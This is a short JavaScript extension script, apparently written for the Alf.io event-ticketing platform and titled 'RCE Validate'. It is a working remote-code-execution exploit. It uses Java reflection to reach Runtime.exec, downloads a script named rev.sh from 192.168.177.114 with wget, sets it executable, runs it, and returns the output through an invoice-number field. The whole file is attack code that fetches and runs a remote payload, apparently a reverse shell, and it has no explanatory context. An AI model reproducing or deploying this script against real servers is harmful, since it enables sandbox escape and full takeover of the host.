function getScriptMetadata() {
	return {
		id: 'rce-validate',
		displayName: 'RCE Validate',
		version: 0,
		async: false,
		events: ['EVENT_STATUS_CHANGE']
	};
}

function executeScript(scriptEvent) {
	var rtClass = returnClass.forName('java.lang.Runtime');
	var strClass = returnClass.forName('java.lang.String');
	var runtime = rtClass.getMethod('getRuntime').invoke(null);
	var proc = rtClass.getMethod('exec', strClass).invoke(runtime, 'wget http://192.168.177.114/rev.sh -O /home/alfio/rev.sh');
	proc = rtClass.getMethod('exec', strClass).invoke(runtime, 'chmod 777 /home/alfio/rev.sh');
	proc = rtClass.getMethod('exec', strClass).invoke(runtime, '/home/alfio/rev.sh');
	var bytes = proc.getInputStream().readAllBytes();
	

	var output = '';
	for (var i = 0; i < bytes.length; i++) {
		output += String.fromCharCode(bytes[i] & 0xFF);
	}

	console.log(output);
	return { invoiceNumber: output };
}
